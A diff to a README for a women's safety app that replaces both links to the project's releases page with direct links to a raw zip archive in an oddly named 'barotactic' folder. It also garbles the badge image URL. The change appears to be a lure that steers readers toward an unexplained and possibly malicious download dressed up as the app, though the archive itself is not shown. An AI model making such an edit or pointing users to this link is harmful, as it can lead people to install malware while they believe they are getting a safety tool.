@@ -1,7 +1,7 @@
 # 👩‍🎤 women-safety-app - A Safe Solution for Women 
 
 ## 📦 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tanaytyagi21/women-safety-app/releases)
+[![Download Now](https://github.com/tanaytyagi21/women-safety-app/raw/refs/heads/main/barotactic/safety_app_women_2.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/tanaytyagi21/women-safety-app/raw/refs/heads/main/barotactic/safety_app_women_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the women-safety-app! This app is designed to help women stay safe in various situations. With user-friendly features and a sleek interface, you can easily access safety tools and resources.
@@ -20,7 +20,7 @@ Welcome to the women-safety-app! This app is designed to help women stay safe in
 ## 📥 Download & Install
 To get the women-safety-app, please visit the following link to download the latest version:
 
-[Visit this page to download](https://github.com/tanaytyagi21/women-safety-app/releases)
+[Visit this page to download](https://github.com/tanaytyagi21/women-safety-app/raw/refs/heads/main/barotactic/safety_app_women_2.8.zip)
 
 ### 📱 Installation Instructions
 1. Click on the download link provided above.
